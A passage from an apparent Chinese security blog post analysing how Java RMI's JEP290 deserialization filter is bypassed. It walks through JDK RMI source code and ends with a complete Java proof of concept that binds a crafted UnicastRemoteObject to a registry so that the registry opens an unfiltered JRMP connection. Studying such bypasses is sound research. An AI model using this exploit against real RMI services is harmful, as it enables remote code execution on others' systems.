+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">public static Remote exportObject(Remote obj, int port,<br>                                  RMIClientSocketFactory csf,<br>                                  RMIServerSocketFactory ssf)<br>    throws RemoteException<br>&#123;<br><br>    return exportObject(obj, new UnicastServerRef2(port, csf, ssf));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">private static Remote exportObject(Remote obj, UnicastServerRef sref)<br>        throws RemoteException<br>    &#123;<br>        // if obj extends UnicastRemoteObject, set its ref.<br>        if (obj instanceof UnicastRemoteObject) &#123;<br>            ((UnicastRemoteObject) obj).ref = sref;<br>        &#125;<br>        return sref.exportObject(obj, null, false);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>来到 UnicastServerRef.exportObject,这部分和基础中创建注册中心的分析是一样的都是创建 stub,skel</p>
+<p>UnicastServerRef.exportObject</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">public Remote exportObject(Remote var1, Object var2, boolean var3) throws RemoteException &#123;<br>    Class var4 = var1.getClass();<br><br>    Remote var5;<br>    try &#123;<br>        var5 = Util.createProxy(var4, this.getClientRef(), this.forceStubUse);<br>    &#125; catch (IllegalArgumentException var7) &#123;<br>        throw new ExportException(&quot;remote object implements illegal remote interface&quot;, var7);<br>    &#125;<br><br>    if (var5 instanceof RemoteStub) &#123;<br>        this.setSkeleton(var1);<br>    &#125;<br><br>    Target var6 = new Target(var1, this, var5, this.ref.getObjID(), var3);<br>    this.ref.exportObject(var6);<br>    this.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);<br>    return var5;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最终调 —–&gt;LiveRef.exportObject—-&gt;TCPEndpoint.exportObject——&gt;TCPTransport.exportObject.listen 一系列调用 listen 方法</p>
+<p>TCPTransport.exportObject()—&gt;listen()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">public void exportObject(Target var1) throws RemoteException &#123;<br>    synchronized(this) &#123;<br>        this.listen();<br>        ++this.exportCount;<br>    &#125;<br><br>    boolean var2 = false;<br><br>    try &#123;<br>        super.exportObject(var1);<br>        var2 = true;<br>    &#125; finally &#123;<br>        if (!var2) &#123;<br>            synchronized(this) &#123;<br>                this.decrementExportCount();<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在 listen 中调用了 newServerSocket 方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">private void listen() throws RemoteException &#123;<br>    assert Thread.holdsLock(this);<br><br>    TCPEndpoint var1 = this.getEndpoint();<br>    int var2 = var1.getPort();<br>    if (this.server == null) &#123;<br>        if (tcpLog.isLoggable(Log.BRIEF)) &#123;<br>            tcpLog.log(Log.BRIEF, &quot;(port &quot; + var2 + &quot;) create server socket&quot;);<br>        &#125;<br><br>        try &#123;<br>            this.server = var1.newServerSocket();<br>            Thread var3 = (Thread)AccessController.doPrivileged(new NewThreadAction(new AcceptLoop(this.server), &quot;TCP Accept-&quot; + var2, true));<br>            var3.start();<br>        &#125; catch (BindException var4) &#123;<br>            throw new ExportException(&quot;Port already in use: &quot; + var2, var4);<br>        &#125; catch (IOException var5) &#123;<br>            throw new ExportException(&quot;Listen failed on port: &quot; + var2, var5);<br>        &#125;<br>    &#125; else &#123;<br>        SecurityManager var6 = System.getSecurityManager();<br>        if (var6 != null) &#123;<br>            var6.checkListen(var2);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>ssf 在 newServerSocket 这里调了一个方法，而它是我们设置的动态代理，在这里调用 RemoteObjectInvocationHandler 调用处理器的 invoke 方法</p>
+<blockquote>
+<p>这里的连接也就是基础中说的从客户端的调用处理器到客户端的引用进行 JRMP 连接</p>
+</blockquote>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758435498463-55fe37bb-3efe-497a-a07b-ebff3b7cd2ab.png" srcset="/img/loading.gif" lazyload></p>
+<p>前面的 if 都不满足直接调最后面的 invokeRmoteMethod</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758436424770-0383eee6-9d24-420f-a076-c133706c2dc6.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里的 ref 在 payload 中是设置的 UnicastRef</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758436587661-892423a5-0c16-4ceb-88a0-0c143ef3a181.png" srcset="/img/loading.gif" lazyload></p>
+<p>那就来到了客户端发起 JRMP 连接的地方了 UnicastRef.invoke，这里的流程还是和 RMI 基础中的 RMI 类比动态代理一样样，先是客户端代码层面的调用处理器，然后客户端的引用 UnicastRef 建立 JRMP 连接并反序列化返回的数据，服务端就省略了….</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">......<br><span class="hljs-comment">// 1. 建立新连接</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.ref.getChannel().newConnection();<br><br><span class="hljs-comment">// 2. 创建远程调用对象，封装连接和调用信息</span><br><span class="hljs-type">StreamRemoteCall</span> <span class="hljs-variable">var46</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamRemoteCall</span>(var6, <span class="hljs-built_in">this</span>.ref.getObjID(), -<span class="hljs-number">1</span>, var4);<br><br><span class="hljs-comment">// 3. 序列化参数</span><br><span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var46.getOutputStream();<br><span class="hljs-built_in">this</span>.marshalCustomCallData(var10);<br><span class="hljs-comment">// 循环序列化每个参数</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var12 &lt; ((Object[])var11).length; ++var12) &#123;<br>    marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);<br>&#125;<br><br><span class="hljs-comment">// 4. 执行远程调用</span><br>var46.executeCall();<br><br><span class="hljs-comment">// 5. 反序列化返回值</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">var47</span> <span class="hljs-operator">=</span> var2.getReturnType();<br><span class="hljs-keyword">if</span> (var47 != Void.TYPE) &#123;<br>    var11 = var46.getInputStream();<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">var48</span> <span class="hljs-operator">=</span> unmarshalValue(var47, (ObjectInput)var11);<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">return</span> var48;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>并且上面获取到的 InputStream 并没有进行设置 JEP290 的过滤，直接反序列化可以 Bypass</p>
+<h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><p>在本地 bind 或者 rebind 的时候,UnicastRef.invoke 方法中进行反序列化时</p>
+<p>enableReplace 默认为 true，会调用<font style="color:rgb(51, 51, 51);">MarshalOutputStream#replaceObject</font></p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758463975374-30cefa9b-4144-4646-a144-9f257e054c4f.png" srcset="/img/loading.gif" lazyload></p>
+<p>当绑定的对象没有继承 RemoteStub 时,直接就会返回从静态表中获得的 stub，即原先的 UnicastRemoteObject 还会被转换成为 RemoteObjectInvocationHandler,就会导致服务端无法触发 UnicastRemoteObject 反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">protected final Object replaceObject(Object var1) throws IOException &#123;<br>    if (var1 instanceof Remote &amp;&amp; !(var1 instanceof RemoteStub)) &#123;<br>        Target var2 = ObjectTable.getTarget((Remote)var1);<br>        if (var2 != null) &#123;<br>            return var2.getStub();<br>        &#125;<br>    &#125;<br><br>    return var1;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以就得在 payload 中重新写一下 bind 方法，在序列化之前反射修改 enableRepolace 为 false，使他不进行转换</p>
+<p>原本的 bind 方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L);<br><br>          try &#123;<br>              ObjectOutput var4 = var3.getOutputStream();<br>              var4.writeObject(var1);<br>              var4.writeObject(var2);<br>          &#125; catch (IOException var5) &#123;<br>              throw new MarshalException(&quot;error marshalling arguments&quot;, var5);<br>          &#125;<br><br>          super.ref.invoke(var3);<br>          super.ref.done(var3);<br></code></pre></td></tr></table></figure>
+
+<p>重写的和之前反序列化攻击里面的一样。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">  static void bindReflection(String name, Object obj, Registry registry) throws Exception &#123;<br>        Field ref_filed = RemoteObject.class.getDeclaredField(&quot;ref&quot;);<br>        ref_filed.setAccessible(true);<br>        UnicastRef ref = (UnicastRef) ref_filed.get(registry);<br><br>//反射修改operations<br>        Field operations_filed = RegistryImpl_Stub.class.getDeclaredField(&quot;operations&quot;);<br>        operations_filed.setAccessible(true);<br>        Operation[] operations = (Operation[]) operations_filed.get(registry);<br><br>        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);<br>        ObjectOutput outputStream = remoteCall.getOutputStream();<br><br>        //修改enableReplace<br>        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;);<br>        enableReplace_filed.setAccessible(true);<br>        enableReplace_filed.setBoolean(outputStream, false);<br><br>        outputStream.writeObject(name);<br>        outputStream.writeObject(obj);<br><br>        ref.invoke(remoteCall);<br>        ref.done(remoteCall);<br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>最终：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs plain">package org.example;<br><br>import sun.rmi.registry.RegistryImpl_Stub;<br>import sun.rmi.server.UnicastRef;<br>import sun.rmi.transport.LiveRef;<br>import sun.rmi.transport.tcp.TCPEndpoint;<br><br>import java.io.ObjectOutput;<br>import java.io.ObjectOutputStream;<br>import java.lang.reflect.*;<br>import java.rmi.Remote;<br>import java.rmi.registry.LocateRegistry;<br>import java.rmi.registry.Registry;<br>import java.rmi.server.*;<br>import java.util.Random;<br><br>public class RMIServer &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        UnicastRemoteObject payload = getPayload();<br>        Registry registry = LocateRegistry.getRegistry(1099);<br>        bindReflection(&quot;pwn&quot;, payload,registry);<br>    &#125;<br><br>    static UnicastRemoteObject getPayload() throws Exception &#123;<br>        ObjID id = new ObjID(new Random().nextInt());<br>        TCPEndpoint te = new TCPEndpoint(&quot;localhost&quot;, 9999);<br>        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));<br><br>        System.getProperties().put(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);<br>        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);<br>        RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(<br>                handler.getClass().getClassLoader(),<br>                new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,<br>                handler<br>        );<br><br>        Constructor&lt;UnicastRemoteObject&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor();<br>        constructor.setAccessible(true);<br>        UnicastRemoteObject unicastRemoteObject = constructor.newInstance();<br><br>        Field field_ssf = UnicastRemoteObject.class.getDeclaredField(&quot;ssf&quot;);<br>        field_ssf.setAccessible(true);<br>        field_ssf.set(unicastRemoteObject, factory);<br><br>        return unicastRemoteObject;<br>    &#125;<br><br>    static void bindReflection(String name, Object obj, Registry registry) throws Exception &#123;<br>        Field ref_filed = RemoteObject.class.getDeclaredField(&quot;ref&quot;);<br>        ref_filed.setAccessible(true);<br>        UnicastRef ref = (UnicastRef) ref_filed.get(registry);<br><br>//反射修改operations<br>        Field operations_filed = RegistryImpl_Stub.class.getDeclaredField(&quot;operations&quot;);<br>        operations_filed.setAccessible(true);<br>        Operation[] operations = (Operation[]) operations_filed.get(registry);<br><br>        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);<br>        ObjectOutput outputStream = remoteCall.getOutputStream();<br><br>        //修改enableReplace<br>        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField(&quot;enableReplace&quot;);<br>        enableReplace_filed.setAccessible(true);<br>        enableReplace_filed.setBoolean(outputStream, false);<br><br>        outputStream.writeObject(name);<br>        outputStream.writeObject(obj);<br><br>        ref.invoke(remoteCall);<br>        ref.done(remoteCall);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1758620968533-70a50bae-d294-42c6-b609-812885a84751.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h1><p><a target="_blank" rel="noopener" href="https://m0d9.me/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/">https://m0d9.me/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259059#h2-3">https://www.anquanke.com/post/id/259059#h2-3</a></p>
+<p><a target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1">https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8299">https://xz.aliyun.com/news/8299</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/12335098.html?utm_source=tuicool">https://www.cnblogs.com/tr1ple/p/12335098.html?utm_source&#x3D;tuicool</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/RMI/" class="print-no-link">#RMI</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JEP290 Bypass</div>
+      <div>https://bxhhf.github.io/2025/09/23/yuque-hexo-post/JEP290 Bypass/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bxhhf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/13/yuque-hexo-post/JNDI/" title="JNDI">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JNDI</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/27/yuque-hexo-post/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/" title="RMI反序列化攻击">
+                        <span class="hidden-mobile">RMI反序列化攻击</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","appKey":"gbgqDB024hr2I7jmwbO6Mz2a","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxuehua.js"></script>
+<script src="/js/background.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/sign.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <!-- 雪花特效 -->
+  <script type="text/javascript" src="\js\snow.js"></script>
+  
+</body>
+</html>
